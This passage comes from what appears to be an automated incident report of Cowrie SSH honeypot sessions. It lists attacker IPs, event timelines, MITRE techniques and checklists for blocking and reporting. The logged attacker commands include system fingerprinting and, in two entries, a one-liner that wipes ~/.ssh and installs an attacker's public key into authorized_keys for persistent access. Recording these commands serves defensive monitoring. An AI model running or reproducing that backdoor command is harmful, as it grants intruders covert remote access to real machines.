| `2026-07-06 13:15:40` | `cowrie.command.input` |
| `2026-07-06 13:15:40` | `cowrie.command.failed` |
| `2026-07-06 13:15:41` | `cowrie.log.closed` |
| `2026-07-06 13:15:41` | `cowrie.session.params` |
| `2026-07-06 13:15:41` | `cowrie.command.input` |
| `2026-07-06 13:15:42` | `cowrie.session.file_download` |
| `2026-07-06 13:15:42` | `cowrie.log.closed` |
| `2026-07-06 13:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39529252e1d3

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-07-06 13:15 |
| **Last Seen** | 2026-07-06 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:15:42` | `cowrie.session.connect` |
| `2026-07-06 13:15:42` | `cowrie.client.version` |
| `2026-07-06 13:15:42` | `cowrie.client.kex` |
| `2026-07-06 13:15:43` | `cowrie.login.success` |
| `2026-07-06 13:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee35cdf53766

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-07-06 13:15 |
| **Last Seen** | 2026-07-06 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:15:44` | `cowrie.session.connect` |
| `2026-07-06 13:15:44` | `cowrie.client.version` |
| `2026-07-06 13:15:44` | `cowrie.client.kex` |
| `2026-07-06 13:15:45` | `cowrie.login.success` |
| `2026-07-06 13:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471253f5c6e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:16 |
| **Last Seen** | 2026-07-06 13:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:16:08` | `cowrie.session.connect` |
| `2026-07-06 13:16:09` | `cowrie.client.version` |
| `2026-07-06 13:16:09` | `cowrie.client.kex` |
| `2026-07-06 13:16:10` | `cowrie.login.success` |
| `2026-07-06 13:16:11` | `cowrie.session.params` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:11` | `cowrie.command.success` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:11` | `cowrie.command.input` |
| `2026-07-06 13:16:12` | `cowrie.log.closed` |
| `2026-07-06 13:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e927120d6f40

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:17 |
| **Last Seen** | 2026-07-06 13:17 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:17:18` | `cowrie.session.connect` |
| `2026-07-06 13:17:21` | `cowrie.client.version` |
| `2026-07-06 13:17:21` | `cowrie.client.kex` |
| `2026-07-06 13:17:42` | `cowrie.login.success` |
| `2026-07-06 13:17:50` | `cowrie.session.params` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:50` | `cowrie.command.success` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:50` | `cowrie.command.input` |
| `2026-07-06 13:17:55` | `cowrie.log.closed` |
| `2026-07-06 13:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5846c04ffe5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:17 |
| **Last Seen** | 2026-07-06 13:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:17:31` | `cowrie.session.connect` |
| `2026-07-06 13:17:31` | `cowrie.client.version` |
| `2026-07-06 13:17:31` | `cowrie.client.kex` |
| `2026-07-06 13:17:33` | `cowrie.login.success` |
| `2026-07-06 13:17:34` | `cowrie.session.params` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:34` | `cowrie.command.success` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:34` | `cowrie.command.input` |
| `2026-07-06 13:17:35` | `cowrie.log.closed` |
| `2026-07-06 13:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b7499eed6ba

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 13:17 |
| **Last Seen** | 2026-07-06 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:17:42` | `cowrie.session.connect` |
| `2026-07-06 13:17:42` | `cowrie.client.version` |
| `2026-07-06 13:17:42` | `cowrie.client.kex` |
| `2026-07-06 13:17:43` | `cowrie.login.success` |
| `2026-07-06 13:17:43` | `cowrie.direct-tcpip.request` |
| `2026-07-06 13:17:43` | `cowrie.direct-tcpip.data` |
| `2026-07-06 13:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab37fa7b271d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:18 |
| **Last Seen** | 2026-07-06 13:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:18:54` | `cowrie.session.connect` |
| `2026-07-06 13:18:55` | `cowrie.client.version` |
| `2026-07-06 13:18:55` | `cowrie.client.kex` |
| `2026-07-06 13:18:56` | `cowrie.login.success` |
| `2026-07-06 13:18:58` | `cowrie.session.params` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.command.success` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.command.input` |
| `2026-07-06 13:18:58` | `cowrie.log.closed` |
| `2026-07-06 13:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2246300567e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:19 |
| **Last Seen** | 2026-07-06 13:20 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:19:38` | `cowrie.session.connect` |
| `2026-07-06 13:19:42` | `cowrie.client.version` |
| `2026-07-06 13:19:42` | `cowrie.client.kex` |
| `2026-07-06 13:20:03` | `cowrie.login.success` |
| `2026-07-06 13:20:11` | `cowrie.session.params` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:11` | `cowrie.command.success` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:11` | `cowrie.command.input` |
| `2026-07-06 13:20:16` | `cowrie.log.closed` |
| `2026-07-06 13:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18536122b240

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:20 |
| **Last Seen** | 2026-07-06 13:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:20:17` | `cowrie.session.connect` |
| `2026-07-06 13:20:17` | `cowrie.client.version` |
| `2026-07-06 13:20:17` | `cowrie.client.kex` |
| `2026-07-06 13:20:19` | `cowrie.login.success` |
| `2026-07-06 13:20:20` | `cowrie.session.params` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:20` | `cowrie.command.success` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:20` | `cowrie.command.input` |
| `2026-07-06 13:20:21` | `cowrie.log.closed` |
| `2026-07-06 13:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89522eff3862

| Field | Detail |
|---|---|
| **Source IP** | `121.200.49[.]221` |
| **First Seen** | 2026-07-06 13:20 |
| **Last Seen** | 2026-07-06 13:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:20:36` | `cowrie.session.connect` |
| `2026-07-06 13:20:36` | `cowrie.client.version` |
| `2026-07-06 13:20:36` | `cowrie.client.kex` |
| `2026-07-06 13:20:37` | `cowrie.login.success` |
| `2026-07-06 13:20:38` | `cowrie.session.params` |
| `2026-07-06 13:20:38` | `cowrie.command.input` |
| `2026-07-06 13:20:38` | `cowrie.command.failed` |
| `2026-07-06 13:20:39` | `cowrie.log.closed` |
| `2026-07-06 13:20:39` | `cowrie.session.params` |
| `2026-07-06 13:20:39` | `cowrie.command.input` |
| `2026-07-06 13:20:39` | `cowrie.session.file_download` |
| `2026-07-06 13:20:39` | `cowrie.log.closed` |
| `2026-07-06 13:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.200.49[.]221` to AbuseIPDB if not already reported
- [ ] Block `121.200.49[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25637cf8cd8e

| Field | Detail |
|---|---|
| **Source IP** | `121.200.49[.]221` |
| **First Seen** | 2026-07-06 13:20 |
| **Last Seen** | 2026-07-06 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:20:40` | `cowrie.session.connect` |
| `2026-07-06 13:20:40` | `cowrie.client.version` |
| `2026-07-06 13:20:40` | `cowrie.client.kex` |
| `2026-07-06 13:20:41` | `cowrie.login.success` |
| `2026-07-06 13:20:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.200.49[.]221` to AbuseIPDB if not already reported
- [ ] Block `121.200.49[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cde0c4e074

| Field | Detail |
|---|---|
| **Source IP** | `121.200.49[.]221` |
| **First Seen** | 2026-07-06 13:20 |
| **Last Seen** | 2026-07-06 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:20:41` | `cowrie.session.connect` |
| `2026-07-06 13:20:41` | `cowrie.client.version` |
| `2026-07-06 13:20:41` | `cowrie.client.kex` |
| `2026-07-06 13:20:42` | `cowrie.login.success` |
| `2026-07-06 13:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.200.49[.]221` to AbuseIPDB if not already reported
- [ ] Block `121.200.49[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32b7ce17ed8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:21 |
| **Last Seen** | 2026-07-06 13:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:21:38` | `cowrie.session.connect` |
| `2026-07-06 13:21:39` | `cowrie.client.version` |
| `2026-07-06 13:21:39` | `cowrie.client.kex` |
| `2026-07-06 13:21:40` | `cowrie.login.success` |
| `2026-07-06 13:21:41` | `cowrie.session.params` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:41` | `cowrie.command.success` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:41` | `cowrie.command.input` |
| `2026-07-06 13:21:42` | `cowrie.log.closed` |
| `2026-07-06 13:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba15aae0b67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:21 |
| **Last Seen** | 2026-07-06 13:22 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:21:53` | `cowrie.session.connect` |
| `2026-07-06 13:21:58` | `cowrie.client.version` |
| `2026-07-06 13:21:58` | `cowrie.client.kex` |
| `2026-07-06 13:22:17` | `cowrie.login.success` |
| `2026-07-06 13:22:26` | `cowrie.session.params` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:26` | `cowrie.command.success` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:26` | `cowrie.command.input` |
| `2026-07-06 13:22:31` | `cowrie.log.closed` |
| `2026-07-06 13:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14ebf9441d8f

| Field | Detail |
|---|---|
| **Source IP** | `129.121.47[.]136` |
| **First Seen** | 2026-07-06 13:22 |
| **Last Seen** | 2026-07-06 13:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:22:07` | `cowrie.session.connect` |
| `2026-07-06 13:22:07` | `cowrie.client.version` |
| `2026-07-06 13:22:07` | `cowrie.client.kex` |
| `2026-07-06 13:22:08` | `cowrie.login.success` |
| `2026-07-06 13:22:08` | `cowrie.session.params` |
